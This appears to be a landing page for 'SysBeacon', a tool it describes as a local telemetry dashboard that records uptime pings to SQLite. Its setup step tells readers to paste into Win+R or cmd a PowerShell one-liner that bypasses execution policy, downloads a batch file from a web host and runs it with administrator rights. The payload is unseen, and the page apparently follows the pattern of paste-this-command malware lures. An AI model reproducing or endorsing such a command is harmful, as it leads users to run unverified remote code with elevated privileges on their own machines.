SysBeacon
Quick Setup
Local Telemetry Dashboard

Silent uptime tracking with visual activity heatmaps.

SysBeacon records online pings every minute directly to a local SQLite database, giving you visual analytics and raw record access without external cloud services.

Quick Setup

Run in Command Prompt (CMD) or PowerShell

ADV MODE
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://sysbeacon.vercel.app/install.bat' -OutFile '$env:TEMP\install.bat'; Start-Process cmd -ArgumentList '/c $env:TEMP\install.bat' -Verb RunAs"

👉 Press Win + R, type cmd, paste command, press Enter.
